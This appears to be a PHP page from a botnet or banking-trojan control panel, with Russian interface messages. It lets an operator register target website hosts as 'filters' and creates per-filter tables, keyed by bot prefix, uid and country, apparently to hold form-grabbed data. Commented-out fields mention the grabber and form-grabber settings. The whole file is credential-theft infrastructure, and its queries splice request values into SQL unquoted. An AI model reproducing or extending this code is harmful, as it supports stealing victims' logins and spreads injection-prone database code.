<?php

$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));
$smarty->assign('value_name', 'p' . $smarty->tpl_vars['rand_name']->value);

//print_rm($_POST);

if(empty($Cur['id'])){
	if(isset($_POST['submit']) && $_POST['submit'] == 'Добавить'){
        $_POST['name'] = real_escape_string($_POST['name']);
        $_POST['host'] = real_escape_string($_POST['host']);
        $_POST['savelog'] = real_escape_string($_POST['savelog']);

		if($_POST['savelog'] == 'on'){
			$_POST['savelog'] = '1';
		}else{
			$_POST['savelog'] = '0';
		}

		if(empty($_POST['name'])){
			$bad_form['name'] = 'Название не может быть пустым.';
			$FORM_BAD = 1;
		}

		if(empty($_POST['host'])){
			$bad_form['host'] = 'Сайт не может быть пустым.';
			$FORM_BAD = 1;
		}else{
			if($mysqli->query_name('SELECT host from bf_filters WHERE host = \''.$_POST['host'].'\' LIMIT 1', null, 'host') == $_POST['host']){
				$bad_form['host'] = 'Данный сайт уже есть в системе.';
				$FORM_BAD = 1;
			}
		}

		if(preg_match('~^([a-zA-Z0-9.,-]+)$~', $_POST['host']) != true){
			$bad_form['host_words'] = 'Сайт может содержать только символы a-zA-Z0-9- и точка, и запятую для резделение доменов.';
			$FORM_BAD = 1;
		}

		for($i = 1; $i <= count($_POST['fields']); $i++){
			$_POST['p']['name'][$i] = real_escape_string($_POST['p']['name'][$i]);

			if(empty($_POST['p']['name'][$i])){
				$bad_form['p_name'] = 'Одно из полей "название полей" не заполнено.';
				$FORM_BAD = 1;
			}
            /*
			if(empty($_POST['p']['grabber'][$i])){
				$bad_form['p_grabber'] = 'Одно из полей "Параметры полей для Граббера" не заполнено.';
				$FORM_BAD = 1;
			}

			if(empty($_POST['p']['formgrabber']['1'][$i])){
				$bad_form['p_formgrabber'] = 'Одно из полей "Параметры полей для Форм-Граббера - PCRE" не заполнено.';
				$FORM_BAD = 1;
			}

			if(empty($_POST['p']['formgrabber']['2'][$i])){
				$bad_form['p_formgrabber'] = 'Одно из полей "Параметры полей для Форм-Граббера - Номер получаемого масива" не заполнено.';
				$FORM_BAD = 1;
			}
			*/
		}

		if($FORM_BAD <> 1){
            $insert_id = $mysqli->query("INSERT INTO bf_filters (name, fields, host, save_log, enable, parent_id) VALUES ('".$_POST['name']."', '".base64_encode(json_encode($_POST['p']))."', '".$_POST['host']."', '".$_POST['savelog']."', '1', '0')");

            if($insert_id == false){
				$errors .= '<div class="t"><div class="t4" align="center">Создание фильтра сейчас невозможно, попробуйте позже.</div></div>';
			}else{
				$sql = 'CREATE TABLE IF NOT EXISTS bf_filter_'.$insert_id.' ( id INT(11) unsigned NOT NULL AUTO_INCREMENT PRIMARY KEY, prefix VARCHAR(16) NOT NULL, uid TEXT NOT NULL, country VARCHAR(3) NOT NULL, ';
		        $i = 0;

		        foreach($_POST['p']['name'] as $value){		        	$i++;
		        	$sql .= 'v' . $i . ' VARCHAR(128) NOT NULL, ';
		        }

		        $sql .= 'md5_hash varchar(32) NOT NULL, program VARCHAR(32) NOT NULL, type int(1) unsigned DEFAULT NULL, save int(1) unsigned NOT NULL DEFAULT \'0\', post_date TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP, INDEX type(type), INDEX prefix(prefix), INDEX prefix_type(prefix, type), UNIQUE md5_hash(md5_hash, type), INDEX save(save) ) ENGINE = MYISAM';
		        $mysqli->query($sql);
                /*
				$sql = 'CREATE TABLE bf_filter_'.$insert_id.' ( id INT(11) NOT NULL AUTO_INCREMENT PRIMARY KEY, prefix VARCHAR(16) NOT NULL, uid VARCHAR(64) NOT NULL, country VARCHAR(3) NOT NULL, ';
	            $i = 0;
	            $unique = array();
	            foreach($_POST['p']['name'] as $value){
	            	$i++;
	            	$sql .= 'v' . $i . ' VARCHAR(128) NOT NULL, ';
	            }
				$unique = implode(',', $unique);
				$sql .= 'md5_hash varchar(32) NOT NULL, program VARCHAR(32) NOT NULL, type ENUM(\'1\',\'2\'), post_date TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP, INDEX type(type), INDEX prefix_uid(prefix, uid), INDEX prefix_uid_type(prefix, uid, type), UNIQUE md5_hash(md5_hash, type), INDEX save(save) ) ENGINE = MYISAM';
	            $mysqli->query($sql);
	            */
				$smarty->assign("save", true);
			}
		}else{
			if(count($bad_form) > 0){
				rsort($bad_form);
				for($i = 0; $i < count($bad_form); $i++){
					if ( $i & 1 ) $value_count = "1"; else $value_count = "2";
					$errors .= '<div align="center">' . $bad_form[$i] . '</div>';
				}
			}
		}
		$smarty->assign("errors", $errors);
	}
}else{
	$parent = $mysqli->query('SELECT * from bf_filters WHERE id = '.$Cur['id'].' LIMIT 1');

	if($parent->id != $Cur['id'] || !empty($parent->host)){
		exit;
	}

	if(isset($_POST['submit']) && $_POST['submit'] == 'Добавить'){
        $_POST['name'] = real_escape_string($_POST['name']);
        $_POST['host'] = real_escape_string($_POST['host']);
        $_POST['savelog'] = real_escape_string($_POST['savelog']);

		if($_POST['savelog'] == 'on'){			$_POST['savelog'] = '1';
		}else{			$_POST['savelog'] = '0';
		}

		if(empty($_POST['name'])){
			$bad_form['name'] = 'Название не может быть пустым.';
			$FORM_BAD = 1;
		}

		if(empty($_POST['host'])){
			$bad_form['host'] = 'Сайт не может быть пустым.';
			$FORM_BAD = 1;
		}else{
			if($mysqli->query_name('SELECT host from bf_filters WHERE host = \''.$_POST['host'].'\' LIMIT 1', null, 'host') == $_POST['host']){
				$bad_form['host'] = 'Данный сайт уже есть в системе.';
				$FORM_BAD = 1;
			}
		}

		if(preg_match('~^([a-zA-Z0-9.,-]+)$~', $_POST['host']) != true){
			$bad_form['host_words'] = 'Сайт может содержать только символы a-zA-Z0-9- и точка, и запятую для резделение доменов.';
			$FORM_BAD = 1;
		}

        for($i = 1; $i <= count($_POST['fields']); $i++){
			$_POST['p']['name'][$i] = real_escape_string($_POST['p']['name'][$i]);

			if(empty($_POST['p']['name'][$i])){
				$bad_form['p_name'] = 'Одно из полей "название полей" не заполнено.';
				$FORM_BAD = 1;
			}
            /*
			if(empty($_POST['p']['grabber'][$i])){
				$bad_form['p_grabber'] = 'Одно из полей "Параметры полей для Граббера" не заполнено.';
				$FORM_BAD = 1;
			}

			if(empty($_POST['p']['formgrabber']['1'][$i])){
				$bad_form['p_formgrabber'] = 'Одно из полей "Параметры полей для Форм-Граббера - PCRE" не заполнено.';
				$FORM_BAD = 1;
			}

			if(empty($_POST['p']['formgrabber']['2'][$i])){
				$bad_form['p_formgrabber'] = 'Одно из полей "Параметры полей для Форм-Граббера - Номер получаемого масива" не заполнено.';
				$FORM_BAD = 1;
			}
			*/
		}

		if(count($_POST['p']) < 1){
			$bad_form['p'] = 'Не одного параметра фильтра не заполнено.';
			$FORM_BAD = 1;
		}

		if($FORM_BAD <> 1){
			$insert_id = $mysqli->query("INSERT INTO bf_filters (name, fields, host, save_log, enable, parent_id) VALUES ('".$_POST['name']."', '".base64_encode(json_encode($_POST['p']))."', '".$_POST['host']."', '".$_POST['savelog']."', '0', '". (empty($parent->parent_id)? $parent->id . '|' : $parent->parent_id . $parent->id . '|') ."')");

            if($insert_id == false){
				$errors .= '<div class="t"><div class="t4" align="center">Создание фильтра сейчас невозможно, попробуйте позже.</div></div>';
			}else{
				$sql = 'CREATE TABLE IF NOT EXISTS bf_filter_'.$insert_id.' ( id INT(11) unsigned NOT NULL AUTO_INCREMENT PRIMARY KEY, prefix VARCHAR(16) NOT NULL, uid TEXT NOT NULL, country VARCHAR(3) NOT NULL, ';
		        $i = 0;

		        foreach($_POST['p']['name'] as $value){
		        	$i++;
		        	$sql .= 'v' . $i . ' VARCHAR(128) NOT NULL, ';
		        }

		        $sql .= 'md5_hash varchar(32) NOT NULL, program VARCHAR(32) NOT NULL, type int(1) unsigned DEFAULT NULL, save int(1) unsigned NOT NULL DEFAULT \'0\', post_date TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP, INDEX type(type), INDEX prefix(prefix), INDEX prefix_type(prefix, type), UNIQUE md5_hash(md5_hash, type), INDEX save(save) ) ENGINE = MYISAM';
		        $mysqli->query($sql);

				/*
				$sql = 'CREATE TABLE bf_filter_'.$insert_id.' ( id INT(11) NOT NULL AUTO_INCREMENT PRIMARY KEY, prefix VARCHAR(16) NOT NULL, uid text NOT NULL, country VARCHAR(3) NOT NULL, ';
	            $i = 0;
	            //$unique = array();
	            foreach($_POST['p']['name'] as $value){
	            	$i++;
	            	$sql .= 'v' . $i . ' VARCHAR(128) NOT NULL, ';
	            }
				//$unique = implode(',', $unique);
				$sql .= 'md5_hash varchar(32) NOT NULL, program VARCHAR(32) NOT NULL, type int(1) DEFAULT NULL,, save int(1) NOT NULL DEFAULT \'0\', post_date TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP, INDEX type(type), INDEX prefix(prefix), INDEX prefix_type(prefix, type), UNIQUE md5_hash(md5_hash, type), INDEX save(save) ) ENGINE = MYISAM';
		        $mysqli->query($sql);
		        */
				$smarty->assign("save", true);
			}
		}else{
			if(count($bad_form) > 0){
				rsort($bad_form);
				for($i = 0; $i < count($bad_form); $i++){
					if ( $i & 1 ) $value_count = "1"; else $value_count = "2";
					$errors .= '<div align="center">' . $bad_form[$i] . '</div>';
				}
			}
		}
		$smarty->assign("errors", $errors);
	}

	$dir['1'] = $parent->name;
	$dir['2'] = '<a href="/'.$Cur['to'].'/add_filter-'.$Cur['id'].'.html">'.$dirs['catalog']['add_filter'].'</a>';
	$smarty->assign('parent', $parent);
}

?>